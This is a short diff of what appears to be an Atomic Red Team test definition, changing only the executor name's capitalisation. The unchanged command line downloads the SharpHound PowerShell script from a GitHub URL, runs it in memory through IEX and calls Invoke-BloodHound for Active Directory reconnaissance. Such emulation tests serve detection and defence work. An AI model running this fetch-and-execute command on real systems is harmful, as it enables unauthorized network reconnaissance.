@@ -32,7 +32,7 @@ atomic_tests:
       type: url
       default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1
   executor:
-    name: Powershell
+    name: powershell
     elevation_required: false
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{bloodurl}'); Invoke-BloodHound
